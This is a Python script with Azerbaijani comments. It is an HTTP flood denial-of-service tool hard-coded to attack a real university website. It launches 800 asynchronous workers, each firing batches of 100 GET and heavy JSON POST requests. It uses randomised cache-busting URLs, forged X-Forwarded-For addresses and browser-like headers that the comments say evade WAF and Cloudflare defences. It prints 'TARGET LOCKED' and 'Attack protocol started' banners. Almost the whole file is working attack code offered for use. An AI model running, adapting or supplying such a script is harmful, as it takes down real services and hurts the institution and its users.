import asyncio
import httpx
import random
import string
import time

# =========================
# SADƏCƏ BURANI DƏYİŞ
TARGET = "https://bbu.edu.az"
# =========================

WORKERS = 800   # Railway-də 800 asinxron worker optimaldır (thread limiti yoxdur)
BATCH = 100     # Hər worker eyni anda 100 "öldürücü" sorğu açır

def r(n=20):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

async def obliterator(wid, client):
    while True:
        try:
            # Keşlənməni (Cache) və WAF analizini bypass edən dinamik URL
            url = f"{TARGET}/?search={r(15)}&v={time.time()}&id={random.randint(100000, 999999)}"

            # Brauzer imitasiyası başlıqları (Cloudflare JS challenge bypass üçün)
            headers = {
                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{random.randint(110,124)}.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate, br",
                "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                "X-Requested-With": "XMLHttpRequest",
                "Connection": "keep-alive"
            }

            tasks = []
            for i in range(BATCH):
                # Hər 5 sorğudan 1-i AĞIR POST (Serverin RAM/CPU-sunu dondurur)
                if i % 5 == 0:
                    # 4 dənə 8KB-lıq random string = ~32KB JSON payload
                    heavy_json = {r(8): r(8192) for _ in range(4)}
                    tasks.append(client.post(url, headers=headers, json=heavy_json, timeout=10))
                else:
                    # Qalanları sürətli GET (Connection pool-u doldurur)
                    tasks.append(client.get(url, headers=headers, timeout=10))

            # Bütün 100 sorğunu eyni anda serverin üstünə çırp (HTTP/2 Multiplexing effekti)
            await asyncio.gather(*tasks, return_exceptions=True)

        except Exception:
            await asyncio.sleep(0.01)

async def main():
    print(f"\n[💀] TARGET LOCKED: {TARGET}")
    print(f"[⚡] Workers: {WORKERS}  |  Batch: {BATCH}  |  Effective RPS: ~{WORKERS * BATCH}")
    print("[🔥] Attack protocol started. Ctrl+C to abort.\n")

    # TCP hüdudlarını tamamilə ləğv edirik
    limits = httpx.Limits(max_connections=None, max_keepalive_connections=None)

    async with httpx.AsyncClient(
        http2=True,          # HTTP/2 Rapid Reset effekti (Cloudflare bypass)
        verify=False, 
        limits=limits,
        timeout=None         # Server donanda bağlantını buraxma (Slowloris persistence)
    ) as client:

        workers = [obliterator(i, client) for i in range(WORKERS)]
        await asyncio.gather(*workers)

if __name__ == "__main__":
    asyncio.run(main())
